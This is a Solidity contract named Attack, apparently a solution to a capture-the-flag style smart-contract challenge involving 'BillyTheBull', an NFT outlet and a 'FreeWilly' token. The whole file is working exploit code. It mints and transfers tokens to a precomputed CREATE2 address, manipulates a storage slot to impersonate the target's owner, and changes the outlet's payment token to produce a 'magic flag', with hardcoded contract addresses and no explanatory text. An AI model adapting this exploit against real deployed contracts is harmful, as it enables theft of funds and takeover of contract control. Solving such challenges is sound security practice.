pragma solidity ^0.8.0;

import { BillyTheBull } from "./BillyTheBull.sol";

import { IFreeWilly } from "./interfaces/IFreeWilly.sol";
import { NFTOutlet } from "./NFTOutlet.sol";
import { CreationCodeProvider } from "./CreationCodeProvider.sol";


contract Attack {

  address constant billyTheBullOwner = 0x584258D4D63e116216EB74BA328e03486B3B3870;

  address immutable owner;
  CreationCodeProvider immutable creationCodeProvider;

  BillyTheBull immutable billyTheBull;
  IFreeWilly immutable freeWilly = IFreeWilly(0xe5608a36489Fe45a8f08fD0c6B028801cE6B38d1);

  address toOverwrite;


  constructor(address _billyTheBull, address _creationCodeProvider) {
    owner = msg.sender;
    billyTheBull = BillyTheBull(_billyTheBull);
    creationCodeProvider = CreationCodeProvider(_creationCodeProvider);
    freeWilly.setApprovalForAll(address(billyTheBull.nftOutlet()), true);
  }

  // function mintFreeWilly() external {
  //   freeWilly.mint(billyTheBull.nftPrice());
  // }

  function getMagicFlag() external returns (bytes memory) {
    freeWilly.mint(billyTheBull.nftPrice());
    freeWilly.transferFrom(address(this), attackAddress(), billyTheBull.nftPrice());
    toOverwrite = address(this);
    billyTheBull.nftOutlet().changePaymentToken(address(freeWilly));
    toOverwrite = billyTheBullOwner;
    return _justGetMagicFlag();
  }

  function _justGetMagicFlag() internal view returns (bytes memory) {
    return abi.encodePacked(bytes1(0xff), owner, bytes32(0), keccak256(abi.encodePacked(creationCodeProvider.getAttackCreationCode(), abi.encode(address(billyTheBull), address(creationCodeProvider)))));
  }

  function justGetMagicFlag() external view returns (bytes memory) {
    return _justGetMagicFlag();
  }

  function attackAddress() internal view returns (address) {
    return address(uint160(uint256(keccak256(_justGetMagicFlag()))));
  }

  function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
  }


}